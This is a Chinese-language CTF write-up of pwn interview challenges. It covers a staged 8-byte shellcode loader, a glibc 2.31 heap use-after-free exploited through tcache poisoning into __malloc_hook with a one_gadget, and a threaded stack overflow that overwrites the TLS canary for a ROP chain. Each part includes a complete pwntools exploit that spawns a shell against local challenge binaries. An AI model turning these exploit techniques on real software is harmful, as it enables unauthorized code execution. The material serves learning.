# XM的面试题 ---- 2025@11 - 19

emmm，小总结一下吧，还是有点紧张了，而且有一些概念不是很清楚，学得孬孬的，这次xm一共是给了4个题，写的时候只出了两个，ennn，没办法，只能这样了，其中一道堆，一道shellcode，至于剩下的两道，一道是多线程修改canary,另一道是house of orange

# shellcode

给了个附件，程序内容很简单：

```c
__int64 vuln()
{
  void *buf; // [rsp+8h] [rbp-8h]

  buf = mmap((void *)0x123000, 0x1000uLL, 7, 34, -1, 0LL);
  puts("please enter your shellcode");
  read(0, buf, 8uLL);
  return ((__int64 (*)(void))buf)();
}
```

很明显，读一个shellcode，然后执行，但是只给了8个字节的空间，查看汇编发现在执行shellcode之前不仅把，eax清零，并且仔细看，rsi依旧是对应的地址------>0x123000，，并且由于call rdx调用shellcode,导致rdx的值很大，因此可以直接read的三个参数都足够了 ，所以很明显，直接调用一个syscal就可以调用read(0,0x123000,[0x12300])

```asm
text:000000000000081D ; __int64 vuln()
.text:000000000000081D                 public vuln
.text:000000000000081D vuln            proc near               ; CODE XREF: main+13↓p
.text:000000000000081D
.text:000000000000081D buf             = qword ptr -8
.text:000000000000081D
.text:000000000000081D ; __unwind {
.text:000000000000081D                 push    rbp
.text:000000000000081E                 mov     rbp, rsp
.text:0000000000000821                 sub     rsp, 10h
.text:0000000000000825                 mov     r9d, 0          ; offset
.text:000000000000082B                 mov     r8d, 0FFFFFFFFh ; fd
.text:0000000000000831                 mov     ecx, 22h ; '"'  ; flags
.text:0000000000000836                 mov     edx, 7          ; prot
.text:000000000000083B                 mov     esi, 1000h      ; len
.text:0000000000000840                 mov     edi, 123000h    ; addr
.text:0000000000000845                 call    _mmap
.text:000000000000084A                 mov     [rbp+buf], rax
.text:000000000000084E                 lea     rdi, s          ; "please enter your shellcode"
.text:0000000000000855                 call    _puts
.text:000000000000085A                 mov     rax, [rbp+buf]
.text:000000000000085E                 mov     edx, 8          ; nbytes
.text:0000000000000863                 mov     rsi, rax        ; buf
.text:0000000000000866                 mov     edi, 0          ; fd
.text:000000000000086B                 call    _read
.text:0000000000000870                 mov     rdx, [rbp+buf]
.text:0000000000000874                 mov     eax, 0
.text:0000000000000879                 call    rdx
.text:000000000000087B                 nop
.text:000000000000087C                 leave
.text:000000000000087D                 retn
.text:000000000000087D ; } // starts at 81D
.text:000000000000087D vuln            endp
```

所以很明显了，第二次read再读一个shellcode，执行execve("/bin/sh",0,0)；注意！！！这里因为double read，所以需要sleep一波，不然容易失败

### EXP

```python
#!/usr/bin/env python3
from pwn import *
from LibcSearcher import *

# 配置
context(os='linux', arch='amd64', log_level='debug')
binary = "./easy_shellcode"

# 远程/本地切换
if args.get("REMOTE"):
    io = remote("127.0.0.1", 8080)
else:
    io = process(binary)

# ELF加载
elf = ELF(binary)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# ========== 常用函数定义 ==========
s       = lambda data               : io.send(data)
sa      = lambda delim, data        : io.sendafter(str(delim), data)
sl      = lambda data               : io.sendline(data)
sla     = lambda delim, data        : io.sendlineafter(str(delim), data)
r       = lambda num=4096           : io.recv(num)
rl      = lambda                    : io.recvline()
ru      = lambda delims, drop=False : io.recvuntil(delims, drop)
itr     = lambda                    : io.interactive()
uu32    = lambda data               : u32(data.ljust(4, b'\x00'))
uu64    = lambda data               : u64(data.ljust(8, b'\x00'))
leak    = lambda name, addr         : log.success('{} ======== > {:#x}'.format(name, addr))
p       = lambda name,data          : print("{} ======== > {}".format(name,data))

# ========== 常用泄露函数 ==========
l64     = lambda                    : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
l32     = lambda                    : u32(io.recvuntil(b"\xf7")[-4:].ljust(4, b"\x00"))
l64_no  = lambda                    : u64(io.recv(6).ljust(8, b'\x00'))
def bug():
  gdb.attach(io)
  pause()
# ========== Exploit 开始 ==========
def exp():
    shellcode = asm("push 0x100;pop rdx;syscall")#+asm("call rdx")
    p("shellcode_len",len(shellcode))
    gdb.attach(io)
    sla("please enter your shellcode",shellcode)
    shellcode1 = b"\x90"*0x10+asm(shellcraft.sh())+asm("mov rsp,0x123000;jmp rsp")
    p("shellcode_len",len(shellcode1))
    sleep(3)
    sl(shellcode1)
    pause()
exp()
itr()
```

# HEAP

一道Glibc2.31的，简单堆题，

发现保护全开

```shell
[*] '/mnt/d/TY/网安笔记/CTF_PWN/面试题总结/XM/heap/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'/home/source/tools/glibc-all-in-one//libs/2.31-0ubuntu9_amd64'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```



```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  char *v3; // rdi
  int v4; // eax
  char buf[4]; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  v3 = "welcome to xmcve";
  puts("welcome to xmcve");
  while ( 1 )
  {
    while ( 1 )
    {
      menu(v3);
      read(0, buf, 4uLL);
      v3 = buf;
      v4 = atoi(buf);
      if ( v4 != 4 )
        break;
      edit();
    }
    if ( v4 <= 4 )
    {
      switch ( v4 )
      {
        case 3:
          show();
          break;
        case 1:
          add();
          break;
        case 2:
          delete();                             // UAF
          break;
      }
    }
  }
}
```

```c
//这里存在一个UAF漏洞，
int delete()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("please input your index: ");
  __isoc99_scanf("%d", &v1);
  if ( !heap_ptr[v1] || v1 >= 0x11 )
    return puts("error");
  free((void *)heap_ptr[v1]);
  return puts("Done");
}
```

然后最多申请16个chunk，那么其实这个题，只需要打一个unlink attack就好了，首先使用tcache bin的key机制，泄漏heap的地址，进而申请到tcache bin的结构体的chunk，从而修改counts ，并且free泄漏地址，再然后，打malloc_hook + one_gadget，可以看[这个博客的部分](https://cao-png.github.io/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/)，或者看[gets的这个博客的前部分](http://www.getspwn.xyz/?p=43)，

### EXP

```python
#!/usr/bin/env python3
from pwn import *
from LibcSearcher import *

# 配置
context(os='linux', arch='amd64', log_level='debug')
binary = "./pwn"

# 远程/本地切换
if args.get("REMOTE"):
    io = remote("127.0.0.1", 8080)
else:
    io = process(binary)

# ELF加载
elf = ELF(binary)
libc = ELF("/home/source/tools/glibc-all-in-one//libs/2.31-0ubuntu9_amd64/libc.so.6")

# ========== 常用函数定义 ==========
s       = lambda data               : io.send(data)
sa      = lambda delim, data        : io.sendafter(str(delim), data)
sl      = lambda data               : io.sendline(data)
sla     = lambda delim, data        : io.sendlineafter(str(delim), data)
r       = lambda num=4096           : io.recv(num)
rl      = lambda                    : io.recvline()
ru      = lambda delims, drop=False : io.recvuntil(delims, drop)
itr     = lambda                    : io.interactive()
uu32    = lambda data               : u32(data.ljust(4, b'\x00'))
uu64    = lambda data               : u64(data.ljust(8, b'\x00'))
leak    = lambda name, addr         : log.success('{} ======== > {:#x}'.format(name, addr))
p       = lambda name,data          : print("{} ======== > {}".format(name,data))

# ========== 常用泄露函数 ==========
l64     = lambda                    : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
l32     = lambda                    : u32(io.recvuntil(b"\xf7")[-4:].ljust(4, b"\x00"))
l64_no  = lambda                    : u64(io.recv(6).ljust(8, b'\x00'))
def bug():
  gdb.attach(io)
  pause()
# [+] ============== some Funtion =========== [+]
def add(index,size):
    sla("choice >>",str(1))
    sla(":",str(index))
    sla(":",str(size))

def delete(index):
    sla("choice >>",str(2))
    sla(":",str(index))

def show(index):
    sla("choice >>",str(3))
    sla(":",str(index))
    
def edit(index,size,content):
    sla("choice >>",str(4))
    sla(":",str(index))
    sla(":",str(size))
    sa(":",content)


# ========== Exploit 开始 ==========
def exp():
    for i in range(2):
        add(i,0x78)
    for i in range(2):
        edit(i,0x78,b'a'*0x10)
        delete(i)
    show(1)
    ru(b" ")
    heap_addr = uu64(ru(b"\nDone",drop=True))&0xfffffffff000
    leak("heap_addr",heap_addr)
    
    # [+] ======= to use tcache_p_chunk ==== [+]
    edit(1,0x78,p64(heap_addr))
    add(2,0x78)
    add(3,0x78)
    #edit(3,0x78,b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab')
    edit(3,0x78,p16(0)*(0x28//2)+p16(7))
    bug()
    for i in range(4,8):
        add(i,0x68)
    pay = b'a'*(0x68)+p64(0xe1)
    edit(4,len(pay),pay)
    delete(5)
    show(5)

    libc_base = l64()-0x1ebbe0
    leak("libc_base",libc_base)

    malloc_hook = libc_base+libc.sym.__malloc_hook
    system = libc_base+libc.sym.system
    free_hook = libc_base+libc.sym.__free_hook
    ogg = libc_base+0xe6af1
    leak("malloc_hook",malloc_hook)
    leak("free_hook",free_hook)
    leak("system",system)

    for i in range(9,11):
        add(i,0x78)
    for i in range(9,11):
        edit(9,0x78,b'a'*0x10)
        delete(9)
    pay = b'a'*0x13+p64(ogg)
    edit(9,0x78,p64(malloc_hook-0x13))
    add(11,0x78)
    add(12,0x78)
    edit(12,len(pay),pay)
    add(14,0x10)
    #bug()
exp()
itr()
"""
❯ one_gadget /home/source/tools/glibc-all-in-one//libs/2.31-0ubuntu9_amd64/libc.so.6
0xe6aee execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe6af1 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe6af4 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
"""
```

# canary

使用TLS覆盖canary,因为这个题我没写出来，所以，详细一点，

查看保护：开启了NX和canary

```shell
❯ checksec pthread
[*] '/mnt/d/TY/网安笔记/CTF_PWN/面试题总结/XM/canary/pthread'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'/home/source/tools/glibc-all-in-one//libs/2.23-0ubuntu3_amd64'
    Stripped:   No
```

函数很简单，

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  pthread_t newthread[4]; // [rsp+0h] [rbp-20h] BYREF

  newthread[3] = __readfsqword(0x28u);
  init(argc, argv, envp);
  puts("A challenge for canary");
  pthread_create(newthread, 0LL, vuln, 0LL);
  pthread_join(newthread[0], 0LL);
  return 0;
}
```

pthread_create创建线程，并且使用pthread_join阻塞等待主进程结束，

并且vuln可以无限溢出，

```c
void *__fastcall vuln(void *a1)
{
  char v2[40]; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts(">");
  gets(v2);
  return 0LL;
}
```

也许可以用多线程修改TLS上的canary，,gdb调试一下：在vuln下断点

```c
❯ gdb pthread
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04.2) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 209 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
/home/source/.gdbinit:3: Error in sourced command file:
No symbol table is loaded.  Use the "file" command.
Reading symbols from pthread...
(No debugging symbols found in pthread)
------- tip of the day (disable with set show-tips off) -------
Use the errno (or errno <number>) command to see the name of the last or provided (libc) error
pwndbg> b *vuln
Breakpoint 1 at 0x400889
pwndbg>
```

跑起来，发现在gets输入的地方距离TLS--->fsbase+0x28(canary的位置)小于1K

```c
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
*RAX  0
 RBX  0
 RCX  0x7ffff74f6a2d (write+45) ◂— mov rdi, qword ptr [rsp]
 RDX  0x7ffff77c5780 ◂— 0
 RDI  0x7ffff73fef20 —▸ 0x7ffff73fef70 —▸ 0x7ffff73ff700 ◂— 0x7ffff73ff700
 RSI  0x7ffff77c46a3 (_IO_2_1_stdout_+131) ◂— 0x7c5780000000000a /* '\n' */
 R8   0x7ffff73ff700 ◂— 0x7ffff73ff700
 R9   0x7ffff73ff700 ◂— 0x7ffff73ff700
 R10  0x3de
 R11  0
 R12  0
 R13  0x7fffffffc48f ◂— 1
 R14  0x7ffff73ff9c0 —▸ 0x7ffff7a18260 (stack_used) ◂— 0x7ffff73ff9c0
 R15  0
 RBP  0x7ffff73fef50 ◂— 0
 RSP  0x7ffff73fef20 —▸ 0x7ffff73fef70 —▸ 0x7ffff73ff700 ◂— 0x7ffff73ff700
*RIP  0x4008b6 (vuln+45) ◂— call gets@plt
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
   0x4008a0 <vuln+23>    mov    edi, 0x4009e4     EDI => 0x4009e4 ◂— add byte ptr ds:[rcx + 0x20], al /* '>' */
   0x4008a5 <vuln+28>    call   puts@plt                    <puts@plt>

   0x4008aa <vuln+33>    lea    rax, [rbp - 0x30]     RAX => 0x7ffff73fef20 —▸ 0x7ffff73fef70 —▸ 0x7ffff73ff700 ◂— ...
   0x4008ae <vuln+37>    mov    rdi, rax              RDI => 0x7ffff73fef20 —▸ 0x7ffff73fef70 —▸ 0x7ffff73ff700 ◂— ...
   0x4008b1 <vuln+40>    mov    eax, 0                EAX => 0
 ► 0x4008b6 <vuln+45>    call   gets@plt                    <gets@plt>
        rdi: 0x7ffff73fef20 —▸ 0x7ffff73fef70 —▸ 0x7ffff73ff700 ◂— 0x7ffff73ff700
        rsi: 0x7ffff77c46a3 (_IO_2_1_stdout_+131) ◂— 0x7c5780000000000a /* '\n' */
        rdx: 0x7ffff77c5780 ◂— 0
        rcx: 0x7ffff74f6a2d (write+45) ◂— mov rdi, qword ptr [rsp]

   0x4008bb <vuln+50>    mov    eax, 0                       EAX => 0
   0x4008c0 <vuln+55>    mov    rdx, qword ptr [rbp - 8]
   0x4008c4 <vuln+59>    xor    rdx, qword ptr fs:[0x28]
   0x4008cd <vuln+68>    je     vuln+75                     <vuln+75>

   0x4008cf <vuln+70>    call   __stack_chk_fail@plt        <__stack_chk_fail@plt>
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rdi rsp 0x7ffff73fef20 —▸ 0x7ffff73fef70 —▸ 0x7ffff73ff700 ◂— 0x7ffff73ff700
01:0008│-028     0x7ffff73fef28 —▸ 0x7ffff73ff700 ◂— 0x7ffff73ff700
02:0010│-020     0x7ffff73fef30 —▸ 0x7ffff73ff700 ◂— 0x7ffff73ff700
03:0018│-018     0x7ffff73fef38 ◂— 0
04:0020│-010     0x7ffff73fef40 —▸ 0x7ffff73ff700 ◂— 0x7ffff73ff700
05:0028│-008     0x7ffff73fef48 ◂— 0x76f71b809579900
06:0030│ rbp     0x7ffff73fef50 ◂— 0
07:0038│+008     0x7ffff73fef58 —▸ 0x7ffff78076fa (start_thread+202) ◂— mov qword ptr fs:[0x630], rax
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0         0x4008b6 vuln+45
   1   0x7ffff78076fa start_thread+202
   2   0x7ffff7506b5d clone+109
─────────────────────────────────────────────────[ THREADS (2 TOTAL) ]──────────────────────────────────────────────────
  ► 2   "pthread" stopped: 0x4008b6 <vuln+45>
    1   "pthread" stopped: 0x7ffff78089cd <pthread_join+189>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> fsbase
0x7ffff73ff700
pwndbg> tel 0x7ffff73ff700
00:0000│ r8 r9 fs_base 0x7ffff73ff700 ◂— 0x7ffff73ff700
01:0008│+7b8           0x7ffff73ff708 —▸ 0x602020 ◂— 1
02:0010│+7c0           0x7ffff73ff710 —▸ 0x7ffff73ff700 ◂— 0x7ffff73ff700
03:0018│+7c8           0x7ffff73ff718 ◂— 1
04:0020│+7d0           0x7ffff73ff720 ◂— 0
05:0028│+7d8           0x7ffff73ff728 ◂— 0x76f71b809579900
06:0030│+7e0           0x7ffff73ff730 ◂— 0xe5e48640eae19d3f
07:0038│+7e8           0x7ffff73ff738 ◂— 0
pwndbg> distance 0x7ffff73ff728  0x7ffff73fef20
0x7ffff73ff728->0x7ffff73fef20 is -0x808 bytes (-0x101 words)
pwndbg>
```

因此一共需要溢出808字节，所以，可以这样布置payload

```python
    payload = b'a'*(0x30-8)+p64(0x123456)+b'a'*8
    payload += p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(retn)+b'a'*(0x808-0x58-1)+p64(0x12345600)
```

这里会有一个结构体，THREAD_SLEF这个结构体在Glibc2.35的时候就在溢出之前，所以溢出会影响，导致这个结构体出现问题，但是在Glibc2.23却没有这样问题，因为THREAD_SLEF在距离fsbase很远的地方，所以，这里不会影响，并且不要覆盖掉fsbase+0x30,要不然就是有概率getshell，所以我们可以在canary最后一个字节改为\x00，这样会被截断，就不会覆盖掉fsbase+0x30,就可以100%getshell，

~~主要是这种方式的资料找得不多，没有学得很明白，以后再说~~

```python
 #!/usr/bin/env python3
from pwn import *
from LibcSearcher import *

# 配置
context(os='linux', arch='amd64', log_level='debug')
binary = "./pthread"

# 远程/本地切换
if args.get("REMOTE"):
    io = remote("127.0.0.1", 8080)
else:
    io = process(binary)

# ELF加载
elf = ELF(binary)
libc = ELF("/home/source/tools/glibc-all-in-one//libs/2.23-0ubuntu3_amd64/libc.so.6")

# ========== 常用函数定义 ==========
s       = lambda data               : io.send(data)
sa      = lambda delim, data        : io.sendafter(str(delim), data)
sl      = lambda data               : io.sendline(data)
sla     = lambda delim, data        : io.sendlineafter(str(delim), data)
r       = lambda num=4096           : io.recv(num)
rl      = lambda                    : io.recvline()
ru      = lambda delims, drop=False : io.recvuntil(delims, drop)
itr     = lambda                    : io.interactive()
uu32    = lambda data               : u32(data.ljust(4, b'\x00'))
uu64    = lambda data               : u64(data.ljust(8, b'\x00'))
leak    = lambda name, addr         : log.success('{} ======== > {:#x}'.format(name, addr))
p       = lambda name,data          : print("{} ======== > {}".format(name,data))

# ========== 常用泄露函数 ==========
l64     = lambda                    : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
l32     = lambda                    : u32(io.recvuntil(b"\xf7")[-4:].ljust(4, b"\x00"))
l64_no  = lambda                    : u64(io.recv(6).ljust(8, b'\x00'))
def bug():
  gdb.attach(io)
  pause()
# ========== Exploit 开始 ==========
def exp():
    rdi = 0x00000000004009c3
    puts_got = elf.got.puts
    puts_plt = elf.plt.puts
    ret = 0x00000000004006b1
    retn = 0x000000000400889

    pay = b'a'*(0x30-8)+p64(0x123456)+b'a'*8
    pay += p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(retn)+b'a'*(0x808-0x58-1)+p64(0x12345600)
    sla(">",pay)
    libc_base = l64()-libc.sym.puts
    system = libc_base+libc.sym.system
    bin_sh = libc_base+next(libc.search("/bin/sh"))
    leak("libc_base",libc_base)
    leak("system",system)
    leak("bin_sh",bin_sh)


    pay = b'a'*(0x30-8)+p64(0x123456)+b'a'*8
    pay += p64(rdi)+p64(bin_sh)+p64(system)#+b'a'*(0x808-0x58)+p64(0x123456)

    #gdb.attach(io)
    sla(">",pay)
    
    #sleep(3)
exp()
itr()
```

